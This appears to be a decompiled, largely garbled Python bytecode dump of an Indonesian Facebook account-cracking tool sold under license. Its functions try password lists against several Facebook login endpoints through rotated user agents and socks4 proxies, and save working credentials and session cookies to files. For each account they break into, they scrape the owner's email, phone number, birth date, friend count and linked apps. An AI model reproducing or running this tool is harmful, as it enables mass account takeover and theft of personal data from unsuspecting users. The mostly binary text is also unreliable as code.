[•] COOKIES  : rE   r�   c                 S   ri  rj  r-   rk  r-   r-   r.   rn  e  ro  rs   �"https://m.facebook.com/profile.php��cookies�headers�\<title\>(.*?)<\/title\>r   �)https://m.facebook.com/profile.php?v=info�,https://m.facebook.com/profile.php?v=friends��/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_�Ahttps://m.facebook.com/timeline/app_collection/?collection_token=�#%3A184985071538002%3A32&_rdc=1&_rdr�=\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>�W\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>�&#064;�@�h\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>�+\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>�%\<span\ class\=".*?"\>(.*?)\<\/span\>�%\<div\ class\=".*?" id\="year_(.*?)">�, �   [✓] Nama Akun       : �   
[✓] Jumlah Teman    : �   
[✓] Jumlah Pengikut : �   
[✓] Email Aktif     : �   
[✓] Nomor Aktif     : �   
[✓] Tahun Akun      : �   
[✓] Tanggal Lahir   : �r   r   �7https://m.facebook.com/settings/apps/tabbed/?tab=active�9https://m.facebook.com/settings/apps/tabbed/?tab=inactive�Diakses menggunakan Facebook�Aplikasi Yang Terkait*
�AAnda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.�(Tidak Ada Aplikasi Aktif Yang Terkait *
�	Aplikasi Aktif : 
�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>�		[r�   �FAnda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau�-
Tidak Ada Aplikasi Kedaluwarsa Yang Terkait
�	Aplikasi Kedaluwarsa :
�   �6r  �choice�u�k�kk�br�   �hh�looprv   r  r	   �ok�cpr�   r�   rR   r0   r1   r3   �ugen�ugen2ry   r�   r4   ru  r�   rb   rc   rt   �search�group�postrt  �get_dict�keysr   r�   rw   �cekerrB   rC   r�   r&  r2   r  �join�itemsr%  ru   r�   r�   r�   r5   �.r3  r4  �bi�pers�fff�ua�ua2ra   �pw�tixrS   �dataa�po�statuscp�	statuscp1�headapp�coki�kuki�statusok�	statusok1�user�infoakun�session�get_id�nama�response�	response2�	response3�	response4�nomerr�   �ttl�teman�pengikut�tahun�cek_thn�nenen�hit1�hit2rW   �cek2�apkAktif�ditambahkan�muncul�
apkKadaluarsa�
kadaluarsar-   r-   r.   r*  8  ��   6


(6, 

(

("�4

 

 ��D�E�r*  c           
   
   C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�tt
t|�t|�tf dd� tj��  t �t��dd�}t�� }|D ]�}z�tt �dd	��tt �d
d��tt �d
d��dd
|ddd�}|jdt| � d t|� d |d�}	d|	�� d v r�dtv r�t�| d | � t| |� n&tdt| |f � tdt  d��!| d | d � t�| d | � t
d7 a
W  n<d|	j"v r�d|	j"v r�tdt| |f � td t# d��!| d | d � td7 aW  nW q? tj$j%y�   t&�'d!� Y q?w td7 ad S )"Nr�   r6  z/
%s---> %s/%s ---> OK:%s ---> CP:%s ---> %s%s%srp   r7  r/   rs   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr\  ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typerF  r_  zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true)ru  zwww.facebook.comZ	error_msgr  r�   z
%s++++ %s|%s ----> CP       r�   r_   r   Zsession_keyZEAAAz
%s++++ %s|%s ----> OK       r�   r�  )(r  r�  r�  r�  r�  r�  r�   r�  r�  rv   r  r	   r�  r�  r�   r�   rR   r0   r1   r3   r�  r�   ry   r�   r  rb   rx   r   r�   rw   r�  r�   r&  r2   rc   r%  r�   r�   r4   r5   )
r3  r4  r�  r�  r�  r�  ra   r�  �head�respr-   r-   r.   r+  �  s:   6:&  �r+  c           -      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�tt
t|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]}�z�t�� }	|j�dd|ddd	d
ddd
dddd�
� |�d|  �j}
t�dt|
���d�t�dt|
���d�t�dt|
���d�t�dt|
���d�| |d�}|j�ddddd|dd
ddd
d|  ddd�� |j d|dd�}d |j!�"� �#� v �r	d!t$v r�t%�&| d" | � t'| |� n7td#� d$| � d%|� �}
t(|
d&d'�}t)t(|d(d)�� t*d*t+ d+��,| d" | d# � t%�&| d" | � t
d7 a
W  �nId,|j!�"� �#� v �r=d-t-v �retd7 a|j!�"� }d.�.d/d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � td#� d2| � d3|� d4|� �}t(|d5d'�}t)t(|d6d)�� W  �n�d!t-v �r<td7 a|j!�"� }d.�.d7d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � | }d8}t�� }|jd9|d:�j}t�1d;t|��d< }|jd=|d:�j}|jd>|d:�j}|jd?|� d@�|d:�j}|jdA|� dB�|d:�j}zt�1dCt|��d< }W n   d8}Y zt�1dDt|��d< �2dEdF�}W n   d8}Y zt�1dGt|��d< }W n   d8}Y zt�1dHt|��d< }W n   d8}Y zt�1dIt|��d } W n   d8} Y zd8}!t�1dJt|��}"|"D ]	}#|!|#dK 7 }!�qHW n   Y |dL|� dM|� dN| � dO|� dP|� dQ|!� dR|� d#�7 }dS\}$}%|jdT|d:�j}&|jdU|d:�j}'dVt�1d;t|&��v �r|dW7 }dX|&v �r�|dY7 }n5|t� dZ�7 }t�1d[t|&��}(t�1d\t|&��})|(D ]}*|$d7 }$|d]|$� d^|*� d|)|% � d#�7 }|%d7 }%�q�d_|'v �r�|d`7 }n;dS\}$}%|t� da�7 }t�1d[t|'��}+t�1d\t|'��},|+D ]}*|$d7 }$|d]|$� d^|*� d|,|% � d#�7 }|%d7 }%�q�n	 td#� d2| � d3|� d4|� d#|� �}t(|d5d'�}t)t(|d6d)�� W  nnW q@W q@ tj3j4�yQ   t�5db� Y q@w td7 ad S )cNr�   r6  z+
%s{~} %s/%s {~} OK:%s {~} CP:%s {~} %s%s%srp   r7  zfree.facebook.comr   r:  r;  r<  r=  r>  r?  zhttps://free.facebook.com/rA  rB  rC  z'https://free.facebook.com/login/?email=rQ  r   rR  zname="m_ts" value="(.*?)"zname="li" value="(.*?)")rV  rW  Zm_tsr�   r�   rX  rZ  zhttps://free.facebook.comr\  )rD  r^  rE  r�   r_  rF  rG  rI  rJ  rK  rL  rM  rN  rO  zThttps://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecatedFra  rc  r  r�   r/   u   [•] ID : re  rN   r<   r�   r>   r�   r_   rf  r  rh  c                 S   ri  rj  r-   rk  r-   r-   r.   rn    ro  zcrack3.<locals>.<listcomp>r�   rd  rp  rq  rE   r�   c                 S   ri  rj  r-   rk  r-   r-   r.   rn    ro  rs   rr  )rt  rv  r   rw  rx  r@  ry  rz  r{  r|  r}  r~  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  )-r3  r4  r�  r�  r�  r�  r�  ra   r�  r�  rS   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r�  r�  rW   r�  r�  r�  r�  r�  r�  r-   r-   r.   r,  �  s   6


(�� 

(

("�4

 

 ��C�D�r,  c           .      C   r5  )cNr�   r6  z+
%s<-> %s/%s <-> OK=%s <-> CP=%s <-> %s%s%srp   r7  �mbasic.facebook.comr   r:  r;  r<  r=  r>  r?  zhttps://mbasic.facebook.com/rA  rB  rC  zqhttps://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2FrQ  r   rR  rS  rT  rU  rZ  �https://mbasic.facebook.comr\  r]  zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0Fra  rc  r  r�   r/   rd  re  rN   r<   r�   r>   r�   r_   rf  rF  rg  r  rh  c                 S   ri  rj  r-   rk  r-   r-   r.   rn  x  ro  zcrack4.<locals>.<listcomp>r�   rp  rq  rE   r�   c                 S   ri  rj  r-   rk  r-   r-   r.   rn  �  ro  rs   z'https://mbasic.facebook.com/profile.phprs  rv  r   z.https://mbasic.facebook.com/profile.php?v=infoz1https://mbasic.facebook.com/profile.php?v=friendsry  zFhttps://mbasic.facebook.com/timeline/app_collection/?collection_token=r{  r|  r}  r~  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  z<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activez>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactiver�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r-   r-   r.   r-  U  r�  r-  c           .      C   r5  )cNr�   r6  z+
%s<-> %s/%s <-> OK/%s <-> CP/%s <-> %s%s%srp   r7  ztouch.facebook.comr   r:  r;  r<  r=  r>  r?  zhttps://touch.facebook.com/rA  rB  rC  zphttps://touch.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2FrQ  r   rR  rS  rT  rU  rZ  zhttps://touch.facebook.comr\  r]  zGhttps://touch.facebook.com/login/device-based/validate-password/?shbl=0Fra  rc  r  r�   r/   rd  re  rN   r<   r�   r>   r�   r_   rf  rF  rg  r  rh  c                 S   ri  rj  r-   rk  r-   r-   r.   rn  �  ro  zcrack5.<locals>.<listcomp>r�   rp  rq  rE   r�   c                 S   ri  rj  r-   rk  r-   r-   r.   rn  �  ro  rs   z&https://touch.facebook.com/profile.phprs  rv  r   z-https://touch.facebook.com/profile.php?v=infoz0https://touch.facebook.com/profile.php?v=friendsry  zEhttps://touch.facebook.com/timeline/app_collection/?collection_token=r{  r|  z[\<a href\="https\:\/\/ltouch\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>r~  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  z;https://touch.facebook.com/settings/apps/tabbed/?tab=activez=https://touch.facebook.com/settings/apps/tabbed/?tab=inactiver�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r-   r-   r.   r.  �  r�  r.  c           .      C   r5  )cNr�   r6  z+
%s<v> %s/%s <x> OK/%s <-> CP/%s <#> %s%s%srp   r7  zx.facebook.comr   r:  r;  r<  r=  r>  r?  zhttps://x.facebook.com/rA  rB  rC  zlhttps://x.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2FrQ  r   rR  rS  rT  rU  rZ  zhttps://x.facebook.comr\  r]  zChttps://x.facebook.com/login/device-based/validate-password/?shbl=0Fra  rc  r  r�   r/   rd  re  rN   r<   r�   r>   r�   r_   rf  rF  rg  r  rh  c                 S   ri  rj  r-   rk  r-   r-   r.   rn  `  ro  zcrack6.<locals>.<listcomp>r�   rp  rq  rE   r�   c                 S   ri  rj  r-   rk  r-   r-   r.   rn  j  ro  rs   z"https://x.facebook.com/profile.phprs  rv  r   z)https://x.facebook.com/profile.php?v=infoz,https://x.facebook.com/profile.php?v=friendsry  zAhttps://x.facebook.com/timeline/app_collection/?collection_token=r{  r|  r}  r~  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  z7https://x.facebook.com/settings/apps/tabbed/?tab=activez9https://x.facebook.com/settings/apps/tabbed/?tab=inactiver�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r-   r-   r.   r/  =  r�  r/  c           /      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�tt
t|�t|�tf dd� tj��  ddt �tdd	��� �� � i}t �t�}t �t�}t�� }|D �]}	�z�t�� }
|j�d
d|ddd
dddddddd�
� |�d�j}t �!dt|���"d�t �!dt|���"d�| d|	dd�}|j�d
dddd|dd
dddddddd �� |j#d!||d"d#�}
d$|
j$�%� �&� v �rd%t'v r�t(�)| d& |	 � t*| |	� n7td'� d(| � d)|	� �}t+|d*d+�}t,t+|d,d-�� td.t- d/��.| d& |	 d' � t(�)| d& |	 � t
d7 a
W  �nTd0|j$�%� �&� v �rDd1d2i}d3t/v �retd7 a|
j$�%� }d4�0d5d6� |j$�%� �1� D ��}td7t2 d/��.| d& |	 d& | d' � td'� d(| � d8|	� d9|� �}t+|d:d+�}t,t+|d;d-�� W  �n�d%t/v �rCtd7 a|
j$�%� }d4�0d<d6� |j$�%� �1� D ��}td7t2 d/��.| d& |	 d& | d' � | }d=}t�� }|jd>||d?�j}t �3d@t|��dA }|jdB||d?�j}|jdC||d?�j}|jd|� dD�||d?�j}|jdE|� dF�||d?�j}zt �3dGt|��dA }W n   d=}Y zt �3dHt|��dA �4dIdJ�}W n   d=}Y zt �3dKt|��dA } W n   d=} Y zt �3dLt|��dA }!W n   d=}!Y zt �3dMt|��d }"W n   d=}"Y zd=}#t �3dNt|��}$|$D ]	}%|#|%dO 7 }#�qMW n   Y |dP|� dQ|!� dR|"� dS|� dT|� dU|#� dV| � d'�7 }dW\}&}'|jdX||d?�j}(|jdY||d?�j})dZt �3d@t|(��v �r|d[7 }d\|(v �r�|d]7 }n5|t� d^�7 }t �3d_t|(��}*t �3d`t|(��}+|*D ]},|&d7 }&|da|&� db|,� d|+|' � d'�7 }|'d7 }'�q�dc|)v �r�|dd7 }n;dW\}&}'|t� de�7 }t �3d_t|)��}-t �3d`t|)��}.|-D ]},|&d7 }&|da|&� db|,� d|.|' � d'�7 }|'d7 }'�qn	 td'� d(| � d8|	� d9|� d'|� �}t+|d:d+�}t,t+|d;d-�� W  nnW qPW qP tj5j6�yX   t�7df� Y qPw td7 ad S )gNr�   r6  u/   
%s<¥> %s/%s <-> OK/\%s <+> CP/\%s <÷> %s%s%srp   r7  �http�socks4://%s�Data/proxy.txtr   r9  r   r:  r;  r<  r=  r>  r?  r@  rA  rB  rC  rP  rQ  r   rR  rS  rT  rU  rZ  r[  r\  r]  r`  F�rm   Zproxiesrb  rc  r  r�   r/   rd  re  rN   r<   r�   r>   r�   r_   rf  rF  rg  r  rh  c                 S   ri  rj  r-   rk  r-   r-   r.   rn  �  ro  zcrack7.<locals>.<listcomp>r�   rp  rq  rE   r�   c                 S   ri  rj  r-   rk  r-   r-   r.   rn  �  ro  rs   rr  rs  rv  r   rw  rx  ry  rz  r{  r|  r}  r~  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  )8r  r�  r�  r�  r�  r�  r�   r�  r�  rv   r  r	   r�  r�  r�   r�   rR   r0   r1   r3   r�   r�   �
splitlinesr�  �ugen3ry   r�   r4   ru  r�   rb   rc   rt   r�  r�  r�  rt  r�  r�  r   r�   rw   r�  rB   rC   r&  r2   r  r�  r�  r%  ru   r�   r�   r�   r5   �/r3  r4  r�  r�  r�  Z
proxy_dictr�  r�  ra   r�  r�  rS   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r�  r�  rW   r�  r�  r�  r�  r�  r�  r-   r-   r.   r0  �  s�   6 


(6, 

(

("�4

 

 ��D�E�r0  c           /      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�tt
t|�t|�tf dd� tj��  ddt �tdd	��� �� � i}t �t�}t �td
d	��� �� �}t�� }|D �]}	�z�t�� }
|j�dd|d
dddddddddd�
� |�d�j}t� dt|���!d�t� dt|���!d�| d|	dd�}|j�ddddd |d
ddddddddd!�� |j"d"||d#d$�}
d%|
j#�$� �%� v �rd&t&v r�t'�(| d' |	 � t)| |	� n7td(� d)| � d*|	� �}t*|d+d,�}t+t*|d-d.�� td/t, d0��-| d' |	 d( � t'�(| d' |	 � t
d7 a
W  �nTd1|j#�$� �%� v �rKd2d3i}d4t.v �rltd7 a|
j#�$� }d5�/d6d7� |j#�$� �0� D ��}td8t1 d0��-| d' |	 d' | d( � td(� d)| � d9|	� d:|� �}t*|d;d,�}t+t*|d<d.�� W  �n�d&t.v �rJtd7 a|
j#�$� }d5�/d=d7� |j#�$� �0� D ��}td8t1 d0��-| d' |	 d' | d( � | }d>}t�� }|jd?||d@�j}t�2dAt|��dB }|jdC||d@�j}|jdD||d@�j}|jd|� dE�||d@�j}|jdF|� dG�||d@�j}zt�2dHt|��dB }W n   d>}Y zt�2dIt|��dB �3dJdK�}W n   d>}Y zt�2dLt|��dB } W n   d>} Y zt�2dMt|��dB }!W n   d>}!Y zt�2dNt|��d }"W n   d>}"Y zd>}#t�2dOt|��}$|$D ]	}%|#|%dP 7 }#�qTW n   Y |dQ|� dR|!� dS|"� dT|� dU|� dV|#� dW| � d(�7 }dX\}&}'|jdY||d@�j}(|jdZ||d@�j})d[t�2dAt|(��v �r&|d\7 }d]|(v �r�|d^7 }n5|t� d_�7 }t�2d`t|(��}*t�2dat|(��}+|*D ]},|&d7 }&|db|&� dc|,� d|+|' � d(�7 }|'d7 }'�q�dd|)v �r�|de7 }n;dX\}&}'|t� df�7 }t�2d`t|)��}-t�2dat|)��}.|-D ]},|&d7 }&|db|&� dc|,� d|.|' � d(�7 }|'d7 }'�q	n	 td(� d)| � d9|	� d:|� d(|� �}t*|d;d,�}t+t*|d<d.�� W  nnW qWW qW tj4j5�y_   t�6dg� Y qWw td7 ad S )hNr�   r6  u-   
%s<£> %s/%s <-> OK/%s <+> CP/%s <÷> %s%s%srp   r7  r�  r�  r�  r   zData/useragent.txtr9  r   r:  r;  r<  r=  r>  r?  r@  rA  rB  rC  rP  rQ  r   rR  rS  rT  rU  rZ  r[  r\  r]  r`  Fr�  rc  r  r�   r/   rd  re  rN   r<   r�   r>   r�   r_   rf  rF  rg  r  rh  c                 S   ri  rj  r-   rk  r-   r-   r.   rn  J  ro  zcrack8.<locals>.<listcomp>r�   rp  rq  rE   r�   c                 S   ri  rj  r-   rk  r-   r-   r.   rn  T  ro  rs   rr  rs  rv  r   rw  rx  ry  rz  r{  r|  r}  r~  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  )7r  r�  r�  r�  r�  r�  r�   r�  r�  rv   r  r	   r�  r�  r�   r�   rR   r0   r1   r3   r�   r�   r�  r�  ry   r�   r4   ru  r�   rb   rc   rt   r�  r�  r�  rt  r�  r�  r   r�   rw   r�  rB   rC   r&  r2   r  r�  r�  r%  ru   r�   r�   r�   r5   r�  r-   r-   r.   r1  &  s�   6 

(6, 

(

("�4

 

 ��D�E�r1  c                 C   s�  d}ddddd|ddd	d
ddd
ddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt
 d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}
t	d't|
jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt
 d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))N�xMozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36r�  rZ  r   r�  r\  �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r;  r<  �navigate�?1r?  �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�
gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7r]  �%https://mbasic.facebook.com/login.phpr)  �r�   rX  r9   T�rm   ru  rb  r^   �form�ZnhrW  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datarQ   rj   rm  �action�rm   ru  �
%s++++ %s|%s ----> CP       %sr�   r_   r�   r/   r   �optionr   �2
%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)�
%s---> %s%sz>
%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)ry   r�   rb   �sopr�  rc   �findr�   r�   r	   r�  rR   r�   r&  r2   r�  rf   rv   r�  r�  r  r�  )r3  r�  r�  r�  ra   �hi�ho�jorm   �lion�anj�kent�opsi�opsii�cr-   r-   r.   r�  �  s<   $
"
�$ 
� ��r�  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�
d
� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}
i }g d+�}|
d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|
d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]
}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|d;d	�� t'�  Y q.w d<}t� �t	|dd	�� t'�  d S )=NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIr>   rG   r�   z] Mulaiz# PROSES CEK OPSI DIMULAIrE   r<   r   r�   r   r�   z
%s++++ %s ----> Error      %sz2
%s---> Pemisah Tidak Didukung Untuk Program Ini%sz
%s---> %s/%s ---> { %s }%srp   r7  r�  r�  rZ  r   r�  r\  r�  r;  r<  r�  r�  r?  r�  r�  r�  r]  r�  r)  r�  Tr�  r^   rc  r�  r�  rQ   rj   rm  r�  r�  r�  r�  r�  r�  z#
%s---> Tidak Dapat Mengecek Opsi%srf  z
%s++++ %s|%s ----> OK       %sz"
%s++++ %s|%s ----> SALAH       %srs   r�   rN   z# DONE)(rv   r�   rC   rB   rQ   rR   r�   rA   r	   r@   r�   �
IndexErrorr4   r5   r�  r�  r  r�  r�  r�  r�  r0   r1   r3   ry   r�   rb   r�  r�  rc   rt  r�  r�  r�  r�   r�   rf   r�   r�   rV   )r   r"  rW   ZloveZkesrk   r�  r�  r�  ra   �headerr�  r�  r�  rm   r�  r�  r�  r�  r�  r�   Zdahr-   r-   r.   r�   �  sr   
"
�($
"
�$
�
�
r�   c            	      C   s�  �z"t �d� tt� dt� dt� dt� dt� dt� dt� dt� dt� d�� tt� dt� d	t� dt� d
t� d�
�} | dv r]t	t
� dt� d
t
� dt� d�� t�d� t �d� t
�  W d S dd| dd�}t�� ��}|jd|d��� d }tdd��| � |d �d�d �d�}|d �d�d �d�}|d  �d�d �d�}|d  �d�d �d�}t	t� dt� d
t� dt� d!t� d|d" � d#|d � d#|d � d|d � d$|d � �� t�d"� t	t� dt� d
t� dt� d%t� d|d" � d#|d � d#|d � d|d � d$|d � �� t�d� t�  W d   � W d S 1 �sw   Y  W d S  t�y>   t
t� dt
� d&t� dt
� d'�� Y d S  t�yc } zt
t� dt
� d&t� dt
� d|� �	� W Y d }~d S d }~ww )(Nr*   aL   _      _____  _____ ______ _   _  _____ _____
| |    |_   _|/ ____|  ____| \ | |/ ____|_   _|
| |      | | | (___ | |__  |  \| | (___   | |
| |      | |  \___ \|  __| | . ` |\___ \  | |
| |____ _| |_ ____) | |____| |\  |____) |_| |_
|______|_____|_____/|______|_| \_|_____/|_____|
  [44m[1;37m INPUT  [41m[1;37m LICENSE [0m


rG   �#rr   zG Silahkan Masukan Lisensi Anda Jika Anda Belum Mempunyai Lisensi Ketik �Getz Untuk Membeli Lisensi...r�   z
 Lisensi :rp   )rb   r  ZGETr   zA Anda Bisa Menghubungi Saya Secara Manual WhatsApp : 085693439427r  z\xdg-open https://wa.me/6285693439427?text=Assalamualaikum+Bang+Zero+Saya+Mau+Beli+Lisensinyar�   r�   Tr�   r�   r�   r�   r�   r�   r�   r�   r   r)   r   �:r�   r   r�   r�   �.r  r  z Apikey Invalid)r+   r,   r8   r  r~   r  r�   rQ   r�   r	   r�   r4   r5   rV   ry   r�   rb   rx   r�   r2   r�   r\   r{   r  )	Zapikey_inputZ_header_ra   r	  r�  r
  Zresqr  r  r-   r-   r.   r  �  sb   
�������
�&	 

�
V
V
(�&2��r  �__main__)�ry   Zbs4rx   r+   r0   r  Zdatetimer4   rt   ZsocketZuuidZcythonZrich�ImportErrorr,   r5   rV   Z
rich.tabler   �meZrich.consoler   rA   r   r�  Zconcurrent.futuresr   r'  r   ZgpZ
rich.panelr   rB   r	   rC   Z
rich.markdownr
   r@   Zrich.columnsr   r�   Zlicensing.modelsZlicensing.methodsr
   r   r   r   r   r   r   r�   r�   r�  r�  r�  r�  rk   r  r�  r�  r�  r�   r   r  Z	lisensikur  r�   r�   ZlisensikunirR   r�  r�   r�  r�  r�  r�  rS   r  �J�S�Nr   �Cr�   r�   r~   Zahr}   Zff�GZzqZoQZII�mr|   r�   r�   r�   r�  r  �ddZdicr�   ZnowZdayZtglr�   ZmonthZblnZyearZthnr%  r&  r*   r8   r:   rD   r�   ra   r\   rh   rT   rU   r9   r�   rZ   r�   r�   rO   r�   r�   r�   r�   rP   r�   r�   r�   r!  r*  r+  r,  r-  r.  r/  r0  r1  r�  r�   r  �__name__r-   r-   r-   r.   �<module>   s�   `

���$8((
	;
2sA11:7t" tttuv:
*
�